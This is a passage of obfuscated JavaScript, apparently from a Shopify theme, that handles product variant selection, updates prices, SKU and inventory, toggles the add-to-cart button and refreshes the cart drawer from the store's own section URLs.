      const _0x5d44a5 = _0x4df889.filter(_0x72749a => _0x72749a.available && _0x72749a["option" + _0x2f1c42] === _0x531328).map(_0x576ed8 => _0x576ed8["option" + (_0x2f1c42 + 0x1)]);
      this.setInputAvailability(_0x5f4206, _0x5d44a5);
    });
  }
  ["setInputAvailability"](_0xd254d4, _0x58a4be) {
    _0xd254d4.forEach(_0x5a388f => {
      if (_0x5a388f.nodeName === "OPTION") {
        if (_0x58a4be.includes(_0x5a388f.getAttribute("value"))) {
          _0x5a388f.innerText = _0x5a388f.getAttribute("value");
        } else {
          _0x5a388f.innerText = window.variantStrings.unavailable_with_option.replace("[value]", _0x5a388f.getAttribute("value"));
        }
      } else if (_0x58a4be.includes(_0x5a388f.getAttribute("value"))) {
        _0x5a388f.classList.remove("disabled");
      } else {
        _0x5a388f.classList.add("disabled");
      }
    });
  }
  ["updatePickupAvailability"]() {
    const _0x19520a = document.querySelector("pickup-availability");
    if (!_0x19520a) {
      return;
    }
    if (this.currentVariant && this.currentVariant.available) {
      _0x19520a.fetchAvailability(this.currentVariant.id);
    } else {
      _0x19520a.removeAttribute("available");
      _0x19520a.innerHTML = "";
    }
  }
  ["removeErrorMessage"]() {
    const _0x10b20a = this.closest("section");
    if (!_0x10b20a) {
      return;
    }
    const _0x27d348 = _0x10b20a.querySelector("product-form");
    if (_0x27d348) {
      _0x27d348.handleErrorMessage();
    }
  }
  ["renderProductInfo"]() {
    const _0x4cbcc3 = this.currentVariant.id;
    const _0x4d6763 = this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section;
    fetch(this.dataset.url + "?variant=" + _0x4cbcc3 + "&section_id=" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section)).then(_0x932e21 => _0x932e21.text()).then(_0x2732ab => {
      if (this.currentVariant.id !== _0x4cbcc3) {
        return;
      }
      const _0x33f7ef = new DOMParser().parseFromString(_0x2732ab, "text/html");
      const _0x275d78 = document.getElementById("price-" + this.dataset.section);
      const _0x8f1ffd = _0x33f7ef.getElementById("price-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x1aa74f = document.getElementById("sticky-atc-separate-price-" + this.dataset.section);
      const _0x24cdf9 = _0x33f7ef.getElementById("sticky-atc-separate-price-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x1d9d0f = document.getElementById("sticky-atc-price-" + this.dataset.section);
      const _0xdb7419 = _0x33f7ef.getElementById("sticky-atc-price-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x212595 = document.getElementById("sticky-atc-image-" + this.dataset.section);
      const _0x35f4e6 = _0x33f7ef.getElementById("sticky-atc-image-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x376f4b = document.getElementById("main-atc-price-" + this.dataset.section);
      const _0x203185 = _0x33f7ef.getElementById("main-atc-price-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x5b8a14 = document.querySelectorAll("[id^=\"custom-label-" + this.dataset.section + "\"]");
      const _0x4c7031 = _0x33f7ef.querySelectorAll("[id^=\"custom-label-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section) + "\"]");
      const _0x57b871 = _0x33f7ef.getElementById("Sku-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x33f121 = document.getElementById("Sku-" + this.dataset.section);
      const _0x51b4ee = _0x33f7ef.getElementById("Inventory-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x25183d = document.getElementById("Inventory-" + this.dataset.section);
      if (_0x275d78 && _0x8f1ffd) {
        _0x275d78.innerHTML = _0x8f1ffd.innerHTML;
      }
      if (_0x1aa74f && _0x24cdf9) {
        _0x1aa74f.innerHTML = _0x24cdf9.innerHTML;
      }
      if (_0x1d9d0f && _0xdb7419) {
        _0x1d9d0f.innerHTML = _0xdb7419.innerHTML;
      }
      if (_0x212595 && _0x35f4e6) {
        _0x212595.src = _0x35f4e6.src;
      }
      if (_0x203185 && _0x376f4b) {
        _0x376f4b.innerHTML = _0x203185.innerHTML;
      }
      if (_0x5b8a14 && _0x4c7031) {
        for (var _0xfd6d0c = 0x0; _0xfd6d0c < _0x5b8a14.length; _0xfd6d0c++) {
          _0x5b8a14[_0xfd6d0c].innerHTML = _0x4c7031[_0xfd6d0c].innerHTML;
        }
      }
      if (_0x51b4ee && _0x25183d) {
        _0x25183d.innerHTML = _0x51b4ee.innerHTML;
      }
      if (_0x57b871 && _0x33f121) {
        _0x33f121.innerHTML = _0x57b871.innerHTML;
        _0x33f121.classList.toggle("visibility-hidden", _0x57b871.classList.contains("visibility-hidden"));
      }
      if (this.QuantityBreaks) {
        const _0x1bece5 = _0x33f7ef.getElementById("quantity-breaks-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        const _0x22bf7c = this.QuantityBreaks.querySelectorAll(".dynamic-price");
        const _0x507c19 = _0x1bece5.querySelectorAll(".dynamic-price");
        for (let _0xebd3e1 = 0x0; _0xebd3e1 < _0x22bf7c.length; _0xebd3e1++) {
          _0x22bf7c[_0xebd3e1].innerHTML = _0x507c19[_0xebd3e1].innerHTML;
        }
        if (this.QuantityBreaks.hasVariants) {
          this.QuantityBreaks.variantSelects.forEach(_0xe583d0 => {
            _0xe583d0.dataset.selectedId = this.currentVariant.id;
          });
          const _0x11c80f = this.QuantityBreaks.querySelectorAll(".quantity-break__variant-select");
          const _0x4ad42c = _0x1bece5.querySelectorAll(".quantity-break__variant-select");
          for (let _0x521554 = 0x0; _0x521554 < _0x11c80f.length; _0x521554++) {
            _0x11c80f[_0x521554].innerHTML = _0x4ad42c[_0x521554].innerHTML;
          }
          this.QuantityBreaks.initVariants();
        }
      }
      if (this.hasQuantityBreaksPicker) {
        const _0x1cedeb = _0x33f7ef.getElementById("variant-selects-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        const _0x1c5110 = this.querySelectorAll(".dynamic-price");
        const _0x502ae5 = _0x1cedeb.querySelectorAll(".dynamic-price");
        for (let _0x188eed = 0x0; _0x188eed < _0x1c5110.length; _0x188eed++) {
          _0x1c5110[_0x188eed].innerHTML = _0x502ae5[_0x188eed].innerHTML;
        }
        if (this.quantityBreaksPickerStyle === "vertical" && this.quantityBreaksPickerDisplayedImages === "variant_images") {
          const _0x5ff293 = this.querySelectorAll(".quantity-break__image img");
          const _0xde6a5c = _0x1cedeb.querySelectorAll(".quantity-break__image img");
          for (let _0x370205 = 0x0; _0x370205 < _0x5ff293.length; _0x370205++) {
            _0x5ff293[_0x370205].src = _0xde6a5c[_0x370205].src;
          }
        }
      }
      if (this.secondarySelect) {
        const _0x569e3c = _0x33f7ef.getElementById("" + this.secondarySelectSelector + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        if (_0x569e3c) {
          this.secondarySelect.innerHTML = _0x569e3c.innerHTML;
        }
      }
      const _0x23d48b = document.getElementById("price-" + this.dataset.section);
      if (_0x23d48b) {
        _0x23d48b.classList.remove("visibility-hidden");
      }
      if (_0x25183d) {
        _0x25183d.classList.toggle("visibility-hidden", _0x51b4ee.innerText === "");
      }
      const _0x3e81e5 = _0x33f7ef.getElementById("ProductSubmitButton-" + _0x4d6763);
      this.toggleAddButton(_0x3e81e5 ? _0x3e81e5.hasAttribute("disabled") : true, window.variantStrings.soldOut);
      publish("variant-change", {
        data: {
          sectionId: _0x4d6763,
          html: _0x33f7ef,
          variant: this.currentVariant
        }
      });
    });
  }
  ["toggleAddButton"](_0xbeeb61 = true, _0x31a98c, _0x52f7a5 = true) {
    const _0xca0a09 = document.getElementById("product-form-" + this.dataset.section);
    if (!_0xca0a09) {
      return;
    }
    const _0x53ad1e = _0xca0a09.querySelector("[name=\"add\"]");
    const _0x41a488 = document.querySelectorAll(".main-product-atc");
    var _0x480864 = _0xca0a09.querySelector(".main-atc__label__text");
    if (!_0x480864) {
      _0x480864 = _0xca0a09.querySelector(".main-atc__label");
    }
    const _0x43de7c = _0xca0a09.querySelector(".main-atc-price");
    if (!_0x53ad1e) {
      return;
    }
    if (_0xbeeb61) {
      _0x53ad1e.setAttribute("disabled", "disabled");
      _0x53ad1e.setAttribute("data-unavailable", "true");
      if (_0x31a98c) {
        _0x480864.textContent = _0x31a98c;
      }
      _0x41a488.forEach(_0x1e031a => {
        _0x1e031a.setAttribute("disabled", "disabled");
      });
      if (_0x43de7c) {
        _0x43de7c.classList.add("hidden");
      }
    } else {
      _0x53ad1e.setAttribute("data-unavailable", "false");
      _0x480864.textContent = window.variantStrings.addToCart;
      if (_0x43de7c) {
        _0x43de7c.classList.remove("hidden");
      }
      if (_0x53ad1e.dataset.requiredFields === _0x53ad1e.dataset.validFields) {
        _0x53ad1e.removeAttribute("disabled");
        _0x41a488.forEach(_0x47866f => {
          _0x47866f.removeAttribute("disabled");
        });
      }
    }
    if (!_0x52f7a5) {
      return;
    }
  }
  ["setUnavailable"]() {
    const _0x4ebbc2 = document.getElementById("product-form-" + this.dataset.section);
    const _0xabc0fc = _0x4ebbc2.querySelector("[name=\"add\"]");
    const _0x2b756e = _0x4ebbc2.querySelector("[name=\"add\"] > .main-atc__label");
    const _0x11d1fb = document.getElementById("price-" + this.dataset.section);
    const _0x3c76bb = document.getElementById("Inventory-" + this.dataset.section);
    const _0x4d33fb = document.getElementById("Sku-" + this.dataset.section);
    if (!_0xabc0fc) {
      return;
    }
    _0x2b756e.textContent = window.variantStrings.unavailable;
    if (_0x11d1fb) {
      _0x11d1fb.classList.add("visibility-hidden");
    }
    if (_0x3c76bb) {
      _0x3c76bb.classList.add("visibility-hidden");
    }
    if (_0x4d33fb) {
      _0x4d33fb.classList.add("visibility-hidden");
    }
  }
  ["getVariantData"]() {
    this.variantData = this.variantData || JSON.parse(this.querySelector("[type=\"application/json\"]").textContent);
    return this.variantData;
  }
}
customElements.define("variant-selects", VariantSelects);
class SecondaryVariantSelect extends VariantSelects {
  constructor() {
    super();
    this.secondarySelectSelector = "variant-selects-";
    this.secondarySelect = document.getElementById("" + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = true;
  }
  ["updateOptions"]() {
    this.options = this.querySelector("select").value.split(",");
  }
}
customElements.define("secondary-variant-select", SecondaryVariantSelect);
class SecondaryVariantSelectSeparate extends VariantSelects {
  constructor() {
    super();
    this.secondarySelectSelector = "variant-selects-";
    this.secondarySelect = document.getElementById("" + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = true;
  }
}
customElements.define("secondary-variant-select-separate", SecondaryVariantSelectSeparate);
function updateCartDrawer() {
  fetch('/?section_id=cart-drawer').then(response => response.text()).then(data => {
    // Create a temporary element to manipulate the HTML
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = data;

    // Find the drawer element and add the active class
    const drawerElement = tempDiv.querySelector('.drawer');
    if (drawerElement) {
      drawerElement.classList.add('active'); // Add the active class
    }

    // Set the modified HTML back to the CartDrawer
    const drawer = document.getElementById('shopify-section-cart-drawer');
    drawer.innerHTML = tempDiv.innerHTML;
  }).catch(error => {
    console.error('Error fetching cart drawer:', error);
  });
}